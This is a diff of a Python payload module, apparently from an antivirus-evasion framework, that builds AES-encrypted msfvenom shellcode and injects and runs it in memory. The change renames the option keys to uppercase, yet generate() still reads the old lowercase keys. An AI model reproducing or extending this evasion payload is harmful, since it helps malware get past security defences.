@@ -25,30 +25,31 @@ from modules.common import encryption
 
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "AES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
         self.language = "python"
         self.extension = "py"
         self.rating = "Excellent"
-        
+
         self.shellcode = shellcode.Shellcode()
-        
+
         # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                 "inject_method" : ["Virtual", "Virtual, Void, Heap"],
-                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
-        
-        
+        self.required_options = {
+                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
+                                    "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
+                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days (\"X\" disables feature)"]
+                                }
+
     def generate(self):
         if self.required_options["inject_method"][0].lower() == "virtual":
             if self.required_options["expire_payload"][0].lower() == "x":
-                
+
                 # Generate Shellcode Using msfvenom
                 Shellcode = self.shellcode.generate()
-        
+
                 # Generate Random Variable Names
                 ShellcodeVariableName = helpers.randomString()
                 RandPtr = helpers.randomString()
